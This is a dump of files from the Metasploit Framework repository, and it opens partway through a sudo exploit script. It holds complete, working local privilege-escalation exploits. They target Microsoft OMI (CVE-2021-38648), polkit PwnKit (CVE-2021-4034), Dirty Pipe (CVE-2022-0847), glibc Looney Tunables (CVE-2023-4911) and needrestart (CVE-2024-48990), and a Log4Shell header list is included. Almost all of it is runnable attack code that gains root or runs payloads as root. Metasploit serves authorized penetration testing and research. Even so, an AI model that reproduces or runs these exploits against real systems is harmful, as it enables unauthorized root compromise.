userspec\n\t\toffset_first_userspec, offset_userspec = offset_userspec, offset_first_userspec\n\n\tenv = create_env(offset_defaults, offset_first_userspec, offset_userspec)\t\n\trun_until_success(argv, env)\n\nif __name__ == \"__main__\":\n\t# global intialization\n\tsudo_ver = check_sudo_version()\n\n\tDEFAULTS_CMND = 269\n\tif sudo_ver >= 15:\n\t\tMATCH_ALL = 284\n\telif sudo_ver >= 13:\n\t\tMATCH_ALL = 282\n\telif sudo_ver >= 7:\n\t\tMATCH_ALL = 280\n\telif sudo_ver < 7:\n\t\tMATCH_ALL = 279\n\t\tDEFAULTS_CMND = 268\n\n\thas_fatal_cleanup = sudo_ver >= 11\n\thas_file = sudo_ver >= 19  # has defaults.file pointer\n\n\thas_ldap = sudo_ver >= 23\n\tif sudo_ver < 19:\n\t\tuserspec_chunk_size = 0x40\n\telif sudo_ver < 23:\n\t\tuserspec_chunk_size = 0x50\n\telse:\n\t\tuserspec_chunk_size = 0x60\n\n\tmain()\n", "timestamp": "2025-10-24T23:39:37.817077"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-38648/README.md", "content": "# CVE-2021-38648 Microsoft OMI Management Interface Authentication Bypass\nThis is an LPE exploit for CVE-2021-38648\n\n## Usage\n\n```\nusage: cve_2021_38648.py [-h] [-s SOCKET_PATH] [--timeout TIMEOUT] command\n\npositional arguments:\n  command               the command to run\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s SOCKET_PATH, --socket SOCKET_PATH\n                        socket file\n  --timeout TIMEOUT     response timeout\n```\n\nThe exploit will exit with a status of 0 on success. The command is limited to 256 characters in length due to the\nhardcoded messages that are exchanged. To increase this, generate a new series of messages using the `strace` command\nbelow, search for the second `writev` syscall and extract each `iovec` instance. There should be six in total, and the\nfirst 4 bytes of each should be consistent.\n\nThe hardcoded messages were recovered using:\n```\nstrace -v -s 5000 -f -xx -e trace=socket,connect,write,writev,close \\\n  /opt/omi/bin/omicli iv root/scx { SCX_OperatingSystem } ExecuteShellCommand { command '...' timeout 0 }\n```\n\nIt is important that the exploit wait on the socket for a response to be received. It doesn't need to be read, but the\nsocket needs to be kept open until either the server closes it or the response is received.\n", "timestamp": "2025-10-24T23:39:38.148200"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-38648/cve_2021_38648.py", "content": "import argparse\nimport os\nimport select\nimport socket\nimport sys\n\ndef main():\n    parser = argparse.ArgumentParser(conflict_handler='resolve')\n    parser.add_argument('-s', '--socket', dest='socket_path', default='/var/opt/omi/run/omiserver.sock', help='socket file')\n    parser.add_argument('--timeout', default=5.0, type=int, help='response timeout')\n    parser.add_argument('command', help='the command to run')\n    arguments = parser.parse_args()\n\n    command = arguments.command.encode('ascii')\n    if len(command) > 256:\n        return os.EX_USAGE\n    command = command.ljust(256, b'\\0')\n\n    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    try:\n        sock.connect(arguments.socket_path)\n    except Exception:\n        return os.EX_UNAVAILABLE\n\n    sock.send(b'\\x2f\\x7e\\xa8\\xb1\\x08\\x06\\x01\\0\\0\\0\\0\\0\\x05\\0\\0\\0\\x88\\x23\\xb0' + b'\\0' * 13 + b'\\x90\\x7a\\xb0\\0\\0\\0\\0\\0\\xbc\\0\\0\\0\\0\\0\\0\\0\\x80\\x76\\xb0\\0\\0\\0\\0\\0\\x50\\0\\0\\0\\0\\0\\0\\0\\x10\\x71\\xb0\\0\\0\\0\\0\\0\\x50\\x05\\0\\0\\0\\0\\0\\0\\xf0\\x30\\xb0\\0\\0\\0\\0\\0\\x6c\\x01\\0\\0\\0\\0\\0\\0\\x60\\x23\\xb0\\0\\0\\0\\0\\0\\xf0\\x03\\0\\0\\0\\0\\0\\0')\n    sock.send(b'\\x57\\x99\\x2b\\x46\\x01\\0\\0\\0\\x0f\\0\\0\\0\\x5f\\x4f\\x4d\\x49\\x5f\\x4f\\x70\\x74\\x69\\x6f\\x6e\\x53\\x65\\x74\\0\\0\\0\\0\\0\\0\\x02\\0\\0\\0\\0\\0\\0\\x40\\x1e\\0\\0\\0\\x5f\\x5f\\x4d\\x49\\x5f\\x4f\\x50\\x45\\x52\\x41\\x54\\x49\\x4f\\x4e\\x4f\\x50\\x54\\x49\\x4f\\x4e\\x53\\x5f\\x43\\x48\\x41\\x4e\\x4e\\x45\\x4c\\0\\0\\0\\x15\\0\\0\\0\\x01\\0\\0\\0\\x03\\0\\0\\0\\0\\0\\0\\0\\x01\\0\\0\\0\\x02\\0\\0\\0\\0\\0\\0\\0\\x1e\\0\\0\\0\\x5f\\x5f\\x4d\\x49\\x5f\\x4f\\x50\\x45\\x52\\x41\\x54\\x49\\x4f\\x4e\\x4f\\x50\\x54\\x49\\x4f\\x4e\\x53\\x5f\\x54\\x49\\x4d\\x45\\x4f\\x55\\x54\\0\\0\\0\\x0c\\0\\0\\0\\x01' + b'\\0' * 15 + b'\\x01\\0\\0\\0\\x1e' + b'\\0' * 19 + b'\\xe3\\x74\\xf4\\x76')\n    sock.send(b'\\x60\\xea\\x6a\\xb2\\0\\0\\0\\0\\x01\\0\\0\\0\\0\\0\\0\\0\\xa0\\x7b\\x41\\x68\\xa9\\x7f\\0\\0\\xe8\\x24\\xb0' + b'\\0' * 21 + b'\\x60\\x23\\xb0\\0\\0\\0\\0\\0\\x20\\x71\\xb0' + b'\\0' * 21)\n    sock.send(b'\\x60\\xea\\x6a\\xb2\\0\\0\\0\\0\\x01\\0\\0\\0\\0\\0\\0\\0\\xa0\\x7b\\x41\\x68\\xa9\\x7f\\0\\0\\xe8\\x24\\xb0' + b'\\0' * 21 + b'\\x60\\x23\\xb0\\0\\0\\0\\0\\0\\x20\\x71\\xb0' + b'\\0' * 21 + b'\\x30\\x27\\xb0\\0\\0\\0\\0\\0\\x03\\0\\0\\0\\0\\0\\0\\0\\x01' + b'\\0' * 35 + b'\\x01\\0\\0\\0\\x1e' + b'\\0' * 19 + b'\\x01' + b'\\0' * 1203)\n    sock.send(b'\\x57\\x99\\x2b\\x46\\x02\\0\\0\\0\\x14\\0\\0\\0\\x53\\x43\\x58\\x5f\\x4f\\x70\\x65\\x72\\x61\\x74\\x69\\x6e\\x67\\x53\\x79\\x73\\x74\\x65\\x6d\\0\\0\\0\\0\\0\\x02\\0\\0\\0\\0\\x10\\0\\x40\\x08\\0\\0\\0\\x63\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\0\\x0d\\0\\0\\0\\x01\\0\\0\\0\\x01\\x01\\0\\0' + command + b'\\0\\0\\0\\0\\0\\x10\\0\\x40\\x08\\0\\0\\0\\x74\\x69\\x6d\\x65\\x6f\\x75\\x74\\0\\x0d\\0\\0\\0\\x01\\0\\0\\0\\x02\\0\\0\\0\\x30\\0\\0\\0\\xe3\\x74\\xf4\\x76')\n    sock.send(b'\\xd0\\x76\\xb0\\0\\0\\0\\0\\0\\x70\\x7a\\xb0\\0\\0\\0\\0\\0\\x80\\x7a\\xb0\\0\\0\\0\\0\\0\\x02\\0\\0\\0\\0\\0\\0\\0\\xff\\xff\\xff\\xff' + b'\\0' * 20 + b'\\x60\\x23\\xb0\\0\\0\\0\\0\\0\\x07\\x10\\0\\0\\x01\\0\\0\\0\\x03' + b'\\0' * 23 + b'\\x11\\x27' + b'\\0' * 142 + b'\\x90\\x76\\xb0\\0\\0\\0\\0\\0\\x90\\x7a\\xb0\\0\\0\\0\\0\\0\\xbc\\0\\0\\0\\0\\0\\0\\0\\xa8\\x24\\xb0\\0\\0\\0\\0\\0\\xb8\\x24\\xb0\\0\\0\\0\\0\\0\\xd0\\x24\\xb0' + b'\\0' * 13 + b'\\xd8\\x2a\\xb0' + b'\\0' * 13 + b'\\xf0\\x30\\xb0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x6c\\x01\\0\\0\\x72\\x6f\\x6f\\x74\\x2f\\x73\\x63\\x78\\0\\0\\0\\0\\0\\0\\0\\0\\x45\\x78\\x65\\x63\\x75\\x74\\x65\\x53\\x68\\x65\\x6c\\x6c\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\0\\0\\0\\0\\0\\x53\\x43\\x58\\x5f\\x4f\\x70\\x65\\x72\\x61\\x74\\x69\\x6e\\x67\\x53\\x79\\x73\\x74\\x65\\x6d\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x0e\\x74\\x5f\\0\\x50\\x25\\xb0' + b'\\0' * 21 + b'\\x60\\x25\\xb0\\0\\0\\0\\0\\0\\x02\\0\\0\\0\\x90' + b'\\0' * 51 + b'\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x5f\\x4f\\x4d\\x49\\x5f\\x4f\\x70\\x74\\x69\\x6f\\x6e\\x53\\x65\\x74\\0\\0\\x60\\x26\\xb0\\0\\0\\0\\0\\0\\xc8\\x26\\xb0' + b'\\0' * 248 + b'\\x40\\x1d\\x6c\\x5f\\0\\xa8\\x26\\xb0' + b'\\0' * 17 + b'\\x15' + b'\\0' * 15 + b'\\x40' + b'\\0' * 27 + b'\\x5f\\x5f\\x4d\\x49\\x5f\\x4f\\x50\\x45\\x52\\x41\\x54\\x49\\x4f\\x4e\\x4f\\x50\\x54\\x49\\x4f\\x4e\\x53\\x5f\\x43\\x48\\x41\\x4e\\x4e\\x45\\x4c\\0\\0\\0\\0\\0\\0\\0\\x1d\\x74\\x5f\\0\\x10\\x27\\xb0' + b'\\0' * 17 + b'\\x0c' + b'\\0' * 15 + b'\\x68' + b'\\0' * 27 + b'\\x5f\\x5f\\x4d\\x49\\x5f\\x4f\\x50\\x45\\x52\\x41\\x54\\x49\\x4f\\x4e\\x4f\\x50\\x54\\x49\\x4f\\x4e\\x53\\x5f\\x54\\x49\\x4d\\x45\\x4f\\x55\\x54\\0\\0\\0\\0\\0\\0\\0\\x01\\0\\0\\0\\x02' + b'\\0' * 23)\n\n    select.select([sock], [], [], arguments.timeout)\n\n    sock.close()\n    return os.EX_OK\n\nif __name__ == '__main__':\n    sys.exit(main())\n", "timestamp": "2025-10-24T23:39:38.469661"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-4034/cve_2021_4034.py", "content": "import subprocess\nimport sys\nimport os\nimport shutil\nfrom ctypes import cdll, c_char_p, POINTER\n\nlibc = cdll.LoadLibrary(\"libc.so.6\")\nlibc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)\n\npolkit_bin = sys.argv[1].encode('latin-1')\npayload_file = sys.argv[2]\nrandom_string_1 = sys.argv[3]\nrandom_string_2 = sys.argv[4]\n\nfile = open(random_string_1 + \"/gconv-modules\", 'w')\nfile.write(\"module UTF-8// \" + random_string_2 + \"// \" + random_string_1 + \" 2\")\nfile.close()\nargv = [None]\ncmd = polkit_bin\nenv = [random_string_1.encode('latin-1')]\nenv.append(b\"PATH=GCONV_PATH=.\")\nenv.append(b\"CHARSET=\" + random_string_2.encode('latin-1'))\nenv.append(b\"SHELL=\"+random_string_1.encode('latin-1'))\nenv.append(None)\n\ncargv = (c_char_p * len(argv))(*argv)\ncenvp = (c_char_p * len(env))(*env)\n\nlibc.execve(cmd, cargv, cenvp)\n\n", "timestamp": "2025-10-24T23:39:38.790719"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2021-44228/http_headers.txt", "content": "Authorization\nCache-Control\nCf-Connecting_ip\nClient-Ip\nContact\nCookie\nForwarded-For-Ip\nForwarded-For\nForwarded\nIf-Modified-Since\nOriginating-Ip\nReferer\nTrue-Client-Ip\nUser-Agent\nX-Api-Version\nX-Client-Ip\nX-Forwarded-For\nX-Leakix\nX-Originating-Ip\nX-Real-Ip\nX-Remote-Addr\nX-Remote-Ip\nX-Wap-Profile\n", "timestamp": "2025-10-24T23:39:39.110093"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2022-0847/CVE-2022-0847.c", "content": "/* SPDX-License-Identifier: GPL-2.0 */\n/*\n * Copyright 2022 CM4all GmbH / IONOS SE\n *\n * author: Max Kellermann <max.kellermann@ionos.com>\n *\n * Proof-of-concept exploit for the Dirty Pipe\n * vulnerability (CVE-2022-0847) caused by an uninitialized\n * \"pipe_buffer.flags\" variable.  It demonstrates how to overwrite any\n * file contents in the page cache, even if the file is not permitted\n * to be written, immutable or on a read-only mount.\n *\n * This exploit requires Linux 5.8 or later; the code path was made\n * reachable by commit f6dd975583bd (\"pipe: merge\n * anon_pipe_buf*_ops\").  The commit did not introduce the bug, it was\n * there before, it just provided an easy way to exploit it.\n *\n * There are two major limitations of this exploit: the offset cannot\n * be on a page boundary (it needs to write one byte before the offset\n * to add a reference to this page to the pipe), and the write cannot\n * cross a page boundary.\n *\n * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\\nssh-ed25519 AAA......\\n'\n *\n * Further explanation: https://dirtypipe.cm4all.com/\n */\n\n#define _GNU_SOURCE\n#include <unistd.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/user.h>\n#include <stdint.h>\n#include <sys/wait.h>\n\n#ifndef PAGE_SIZE\n#define PAGE_SIZE 0x1000\n#endif\n\nuint8_t payload_bytes[PAGE_SIZE-1] = \"PAYLOAD_PLACEHOLDER\";\n\n/**\n * Create a pipe where all \"bufs\" on the pipe_inode_info ring have the\n * PIPE_BUF_FLAG_CAN_MERGE flag set.\n */\nstatic void prepare_pipe(int p[2])\n{\n\tif (pipe(p)) abort();\n\n\tconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);\n\tstatic char buffer[4096];\n\n\t/* fill the pipe completely; each pipe_buffer will now have\n\t   the PIPE_BUF_FLAG_CAN_MERGE flag */\n\tfor (unsigned r = pipe_size; r > 0;) {\n\t\tunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;\n\t\twrite(p[1], buffer, n);\n\t\tr -= n;\n\t}\n\n\t/* drain the pipe, freeing all pipe_buffer instances (but\n\t   leaving the flags initialized) */\n\tfor (unsigned r = pipe_size; r > 0;) {\n\t\tunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;\n\t\tread(p[0], buffer, n);\n\t\tr -= n;\n\t}\n\n\t/* the pipe is now empty, and if somebody adds a new\n\t   pipe_buffer without initializing its \"flags\", the buffer\n\t   will be mergeable */\n}\n\nint hax(const char *filename, off_t offset, uint8_t *data, size_t len) {\n\t/* open the input file and validate the specified offset */\n\tconst int fd = open(filename, O_RDONLY); // yes, read-only! :-)\n\tif (fd < 0) {\n\t\tperror(\"open failed\");\n\t\treturn -1;\n\t}\n\n\tstruct stat st;\n\tif (fstat(fd, &st)) {\n\t\tperror(\"stat failed\");\n\t\treturn -1;\n\t}\n\n\t/* create the pipe with all flags initialized with\n\t   PIPE_BUF_FLAG_CAN_MERGE */\n\tint p[2];\n\tprepare_pipe(p);\n\n\t/* splice one byte from before the specified offset into the\n\t   pipe; this will add a reference to the page cache, but\n\t   since copy_page_to_iter_pipe() does not initialize the\n\t   \"flags\", PIPE_BUF_FLAG_CAN_MERGE is still set */\n\t--offset;\n\tssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);\n\tif (nbytes < 0) {\n\t\tperror(\"splice failed\");\n\t\treturn -1;\n\t}\n\tif (nbytes == 0) {\n\t\tfprintf(stderr, \"short splice\\n\");\n\t\treturn -1;\n\t}\n\n\t/* the following write will not create a new pipe_buffer, but\n\t   will instead write into the page cache, because of the\n\t   PIPE_BUF_FLAG_CAN_MERGE flag */\n\tnbytes = write(p[1], data, len);\n\tif (nbytes < 0) {\n\t\tperror(\"write failed\");\n\t\treturn -1;\n\t}\n\tif ((size_t)nbytes < len) {\n\t\tfprintf(stderr, \"short write\\n\");\n\t\treturn -1;\n\t}\n\n\tclose(fd);\n\n\treturn 0;\n}\n\nint main(int argc, char **argv) {\n\tif (argc != 2) {\n\t\tprintf(\"Usage: %s suid_binary\\n\", argv[0]);\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tint run_check = 0;\n\tchar * suid_binary = argv[1];\n\tprintf(\"[+] dirtypipe %s\\n\", suid_binary);\n\tsize_t payload_size = sizeof(payload_bytes);\n\tif (payload_bytes[0] == 'P' &&\n\t\t\tpayload_bytes[1] == 'A' &&\n\t\t\tpayload_bytes[2] == 'Y' &&\n\t\t\tpayload_bytes[3] == 'L') {\n\t\tpayload_size = strlen(payload_bytes);\n\t\tprintf(\"[+] using dud payload...\\n\");\n\t\trun_check = 1;\n\t}\n\tint fd = open(suid_binary, O_RDONLY);\n\tuint8_t * orig_bytes = malloc(payload_size);\n\tlseek(fd, 1, SEEK_SET);\n\tread(fd, orig_bytes, payload_size);\n\tclose(fd);\n\n\tprintf(\"[+] hijacking suid binary...\\n\");\n\tif (hax(suid_binary, 1, payload_bytes, payload_size) != 0) {\n\t\tprintf(\"[+] overwrite failed\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tif (run_check) {\n\t\treturn EXIT_SUCCESS;\n\t}\n\n\tprintf(\"[+] running suid payload...\\n\");\n\tpid_t pid = fork();\n\tif (pid < 0) {\n\t\tprintf(\"[-] fork failed...\\n\");\n\t} else if (pid > 0) {\n\t\tint status;\n\t\twaitpid(pid, &status, 0);\n\t} else {\n\t\tchar *args[] = {suid_binary, NULL, NULL};\n\t\texecve(args[0], args, NULL);\n\t\texit(EXIT_FAILURE);\n\t\treturn 0;\n\t}\n\n\tprintf(\"[+] restoring suid binary...\\n\");\n\tif (hax(suid_binary, 1, orig_bytes, payload_size) != 0) {\n\t\tprintf(\"[-] restore failed\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\treturn EXIT_SUCCESS;\n}\n\n", "timestamp": "2025-10-24T23:39:39.772975"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2023-4911/cve_2023_4911.py", "content": "import binascii\nimport os\nimport resource\nimport time\nimport struct\nimport sys\n\nfrom ctypes import *\nfrom ctypes.util import find_library\nfrom shutil import which\n\nTUNABLES_MISCONFIG = b\"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=\"\nSTRING_TABLE_INDEX = \"shstrndx\"\nNUMBER_OF_ENTRIES = \"shnum\"\nENTRY_SIZE = \"shentsize\"\nENTRY_KEYS = \"name type flags addr offset size link info addralign entsize\"\nHEADER_ENTRY_FORMAT_64_BIT = \"<LLQQQQLLQQ\"\nHEADER_ENTRY_FORMAT_32_BIT = \"<LLLLLLLLLL\"\nGNU_BUILD_ID = \".note.gnu.build-id\"\nLIBC_START_MAIN = \"__libc_start_main\"\nDYNAMIC_SYMBOL = \".dynsym\"\nDYNAMIC_STRING = \".dynstr\"\nSYMBOL_STRUCTURE_KEYS_64_BIT = \"name info other shndx value size\"\nSYMBOL_STRUCTURE_FORMAT_64_BIT = \"<LBBHQQ\"\nSYMBOL_STRUCTURE_KEYS_32_BIT = \"name value size info other shndx\"\nSYMBOL_STRUCTURE_FORMAT_32_BIT = \"<LLLBBH\"\nELF_HEADER_KEYS = f\"type machine version entry phoff shoff flags ehsize phtentsize phnum {ENTRY_SIZE} {NUMBER_OF_ENTRIES} {STRING_TABLE_INDEX}\"\nELF_ENTRY_FORMAT_64_BIT = \"<HHLQQQLHHHHHH\"\nELF_ENTRY_FORMAT_32_BIT = \"<HHLLLLLHHHHHH\"\n\nunhex = lambda v: binascii.unhexlify(v.replace(\" \", \"\"))\n\nTARGETS = {\n    \"i686\": {\n        \"shellcode\": unhex(\n            \"METASPLOIT_SHELL_CODE\"\n        ),\n        \"exitcode\": unhex(\"6a665b6a0158cd80\"),\n        \"stack_top\": 0xC0000000,\n        \"stack_aslr_bits\": 23,\n    },\n    \"x86_64\": {\n        \"shellcode\": unhex(\n            \"METASPLOIT_SHELL_CODE\"\n        ),\n        \"exitcode\": unhex(\"6a665f6a3c580f05\"),\n        \"stack_top\": 0x800000000000,\n        \"stack_aslr_bits\": 34,\n    },\n    \"aarch64\": {\n        \"shellcode\": unhex(\n            \"METASPLOIT_SHELL_CODE\"\n        ),\n        \"exitcode\": unhex(\"c00c80d2a80b80d2010000d4\"),\n        \"stack_top\": 0x1000000000000,\n        \"stack_aslr_bits\": 30,\n    },\n}\n\n# Magic offsets for build IDs can be found for versions of glibc by disabling ASLR and using the original PoC: https://haxx.in/files/gnu-acme.py\nBUILD_IDS = METASPLOIT_BUILD_IDS\n\nlibc = cdll.LoadLibrary(\"libc.so.6\")\nlibc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)\nresource.setrlimit(\n    resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)\n)\n\n\ndef find_path_before_null_character(blob_data, start_offset):\n    current_position = start_offset\n    while current_position > 0:\n        current_byte = blob_data[current_position]\n        next_byte = blob_data[current_position + 1] if current_position + 1 < len(blob_data) else None\n\n        if current_byte != 0 and current_byte != 0x2F and next_byte == 0:\n            path_byte = bytes([current_byte])\n            offset_from_start = current_position - start_offset\n            return {\"path\": path_byte, \"offset\": offset_from_start}\n\n        current_position -= 1\n    return None\n\n\ndef parse_structured_data(structure_format, structure_keys, structure_data):\n    unpacked_data = struct.unpack(structure_format, structure_data)\n    parsed_structure = dict(zip(structure_keys.split(\" \"), unpacked_data))\n    return parsed_structure\n\n\ndef fetch_c_library_path():\n    class LoadedLibrary(Structure):\n        _fields_ = [(\"l_addr\", c_void_p), (\"l_name\", c_char_p)]\n\n    libc_library = CDLL(find_library(\"c\"))\n    dl_library = CDLL(find_library(\"dl\"))\n\n    dl_info_function = dl_library.dlinfo\n    dl_info_function.argtypes = c_void_p, c_int, c_void_p\n    dl_info_function.restype = c_int\n\n    link_map_ptr = c_void_p()\n    dl_info_function(libc_library._handle, 2, byref(link_map_ptr))\n\n    return cast(link_map_ptr, POINTER(LoadedLibrary)).contents.l_name\n\n\ndef execute_process(executable_path, arguments_list, environment_variables):\n    libc.execve(executable_path, arguments_list, environment_variables)\n\n\ndef execute_and_monitor(executable, arguments, environment):\n    argument_pointers = (c_char_p * len(arguments))(*arguments)\n    environment_pointers = (c_char_p * len(environment))(*environment)\n\n    child_pid = os.fork()\n    if not child_pid:\n        execute_process(executable, argument_pointers, environment_pointers)\n        exit(0)\n\n    start_time = time.time()\n    while True:\n        try:\n            pid, status = os.waitpid(child_pid, os.WNOHANG)\n            if pid == child_pid:\n                if os.WIFEXITED(status):\n                    return os.WEXITSTATUS(status) & 0xFF7F\n                else:\n                    return 0\n        except:\n            pass\n        current_time = time.time()\n        if current_time - start_time >= 1.5:\n            os.waitpid(child_pid, 0)\n            return \"Success\"\n\n\nclass DelayedElfParser:\n    def __init__(self, filename):\n        self.data = open(filename, \"rb\").read()\n        self.architecture = 64 if self.data[4] == 2 else 32\n\n        elf_header_size = 0x30 if self.architecture == 64 else 0x24\n\n        self.header = parse_structured_data(\n            ELF_ENTRY_FORMAT_64_BIT if self.architecture == 64 else ELF_ENTRY_FORMAT_32_BIT,\n            ELF_HEADER_KEYS,\n            self.data[0x10: 0x10 + elf_header_size],\n        )\n        section_header_table_index = self.extract_section_header(self.header[STRING_TABLE_INDEX])\n        self.section_header_names = self.data[section_header_table_index[\"offset\"] : section_header_table_index[\"offset\"] + section_header_table_index[\"size\"]]\n\n    def extract_section_header(self, index):\n        header_offset = self.header[\"shoff\"] + (index * self.header[ENTRY_SIZE])\n        entry_format = HEADER_ENTRY_FORMAT_64_BIT if self.architecture == 64 else HEADER_ENTRY_FORMAT_32_BIT\n\n        return parse_structured_data(entry_format, ENTRY_KEYS, self.data[header_offset : header_offset + self.header[ENTRY_SIZE]])\n\n    def extract_section_header_by_name(self, section_name):\n        encoded_name = section_name.encode()\n        for section_index in range(self.header[NUMBER_OF_ENTRIES]):\n            section_header = self.extract_section_header(section_index)\n            section_name_data = self.section_header_names[section_header[\"name\"]:].split(b\"\\x00\")[0]\n            if section_name_data == encoded_name:\n                return section_header\n        return None\n\n    def extract_section_by_name(self, section_name):\n        section_header = self.extract_section_header_by_name(section_name)\n        if section_header:\n            start_offset = section_header[\"offset\"]\n            end_offset = start_offset + section_header[\"size\"]\n            return self.data[start_offset:end_offset]\n        return None\n\n    def extract_symbol_value(self, symbol_name):\n        encoded_name = symbol_name.encode()\n        dynamic_symbol = self.extract_section_by_name(DYNAMIC_SYMBOL)\n        dynamic_string = self.extract_section_by_name(DYNAMIC_STRING)\n        symbol_entry_size = 24 if self.architecture == 64 else 16\n\n        for entry_index in range(len(dynamic_symbol) // symbol_entry_size):\n            entry_start = entry_index * symbol_entry_size\n\n            if self.architecture == 64:\n                symbol_entry = parse_structured_data(\n                    SYMBOL_STRUCTURE_FORMAT_64_BIT,\n                    SYMBOL_STRUCTURE_KEYS_64_BIT,\n                    dynamic_symbol[entry_start: entry_start + symbol_entry_size],\n                )\n            else:\n                symbol_entry = parse_structured_data(\n                    SYMBOL_STRUCTURE_FORMAT_32_BIT,\n                    SYMBOL_STRUCTURE_KEYS_32_BIT,\n                    dynamic_symbol[entry_start: entry_start + symbol_entry_size],\n                )\n\n            entry_name = dynamic_string[symbol_entry[\"name\"]:].split(b\"\\x00\")[0]\n            if entry_name == encoded_name:\n                return symbol_entry[\"value\"]\n\n        return None\n\n\ndef create_environment(adjustment, address, offset, bits=64):\n    if bits == 64:\n        environment = [\n            TUNABLES_MISCONFIG + b\"P\" * adjustment,\n            TUNABLES_MISCONFIG + b\"X\" * 8,\n            TUNABLES_MISCONFIG + b\"X\" * 7,\n            b\"GLIBC_TUNABLES=glibc.mem.tagging=\" + b\"Y\" * 24,\n        ]\n\n        padding = 172\n        fill = 47\n    else:\n        environment = [\n            TUNABLES_MISCONFIG + b\"P\" * adjustment,\n            TUNABLES_MISCONFIG + b\"X\" * 7,\n            b\"GLIBC_TUNABLES=glibc.mem.tagging=\" + b\"X\" * 14,\n        ]\n\n        padding = 87\n        fill = 47 * 2\n\n    for j in range(padding):\n        environment.append(b\"\")\n\n    if bits == 64:\n        environment.append(struct.pack(\"<Q\", address))\n        environment.append(b\"\")\n    else:\n        environment.append(struct.pack(\"<L\", address))\n\n    for _ in range(384):\n        environment.append(b\"\")\n\n    for _ in range(fill):\n        if bits == 64:\n            environment.append(\n                struct.pack(\"<Q\", offset & 0xFFFFFFFFFFFFFFFF) * 16382 + b\"\\xaa\" * 7\n            )\n        else:\n            environment.append(\n                struct.pack(\"<L\", offset & 0xFFFFFFFF) * 16382 + b\"\\xaa\" * 7\n            )\n\n    environment.append(None)\n    return environment\n\n\ndef error_and_exit(error_msg):\n    print(\"Error: %s\" % error_msg)\n    exit(-1)\n\n\nif __name__ == \"__main__\":\n\n    architecture = os.uname().machine\n\n    if architecture not in TARGETS.keys():\n        error_and_exit(\"This target's architecture '%s' is not supported by this exploit\" % architecture)\n\n    c_library_path = fetch_c_library_path()\n    su_binary_path = which(\"su\")\n\n    memory_alignment = ((0x100 - (len(su_binary_path) + 1 + 8)) & 7) + 8\n    su_binary_elf = DelayedElfParser(su_binary_path)\n    dynamic_linker_path = su_binary_elf.extract_section_by_name(\".interp\").strip(b\"\\x00\").decode('utf-8')\n    dynamic_linker_elf = DelayedElfParser(dynamic_linker_path)\n    dynamic_linker_build_id = binascii.hexlify(\n        dynamic_linker_elf.extract_section_by_name(GNU_BUILD_ID)[-20:]).decode()\n\n    if dynamic_linker_build_id not in BUILD_IDS.keys():\n        error_and_exit(\"The build ID found is not exploitable\")\n\n    libc_elf = DelayedElfParser(c_library_path)\n    libc_start_main = libc_elf.extract_symbol_value(LIBC_START_MAIN)\n\n    if libc_start_main == None:\n        error_and_exit(\"The symbol in the libc ELF '__libc_start_main' could not be resolved.\")\n\n    su_binary_offset = su_binary_elf.extract_section_header_by_name(\".dynstr\")[\"offset\"]\n    potential_path = find_path_before_null_character(su_binary_elf.data, su_binary_offset)\n\n    if potential_path is None:\n        error_and_exit(\"The potential path in the su_binary could not be found.\")\n\n    if not os.path.exists(potential_path[\"path\"]):\n        os.mkdir(potential_path[\"path\"])\n\n    with open(potential_path[\"path\"] + b\"/libc.so.6\", \"wb\") as file_handle:\n        file_handle.write(libc_elf.data[0:libc_start_main])\n        file_handle.write(TARGETS[architecture][\"shellcode\"])\n        file_handle.write(libc_elf.data[libc_start_main + len(TARGETS[architecture][\"shellcode\"]):])\n\n    stack_address = TARGETS[architecture][\"stack_top\"] - (1 << (TARGETS[architecture][\"stack_aslr_bits\"]))\n\n    stack_address += memory_alignment\n\n    for i in range(6 if su_binary_elf.architecture == 64 else 4):\n        if (stack_address >> (i * 8)) & 0xFF == 0:\n            stack_address |= 0x10 << (i * 8)\n\n    environment = create_environment(BUILD_IDS[dynamic_linker_build_id], stack_address, potential_path[\"offset\"],\n                                     su_binary_elf.architecture)\n    count = 1\n    argv = [b\"su\", b\"--help\", None]\n    while True:\n        if execute_and_monitor(su_binary_path.encode(), argv, environment) == \"Success\":\n            exit(0)\n        count += 1\n", "timestamp": "2025-10-24T23:39:40.090727"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2024-48990/sleeper.py", "content": "import os\nimport time\nimport pwd\n\nprint(\"#########################\\n\\nDont mind the error message above\\n\\nWaiting for needrestart to run...\")\n\nwhile True:\n    try:\n        file_stat = os.stat('PAYLOAD_PATH')\n    except FileNotFoundError:\n        exit()\n    username = pwd.getpwuid(file_stat.st_uid).pw_name\n    #print(f\"Payload owned by: {username}. Stats: {file_stat}\")\n    if (username == 'root'):\n        os.system('PAYLOAD_PATH &')\n        exit()\n    time.sleep(1)", "timestamp": "2025-10-24T23:39:42.438399"}
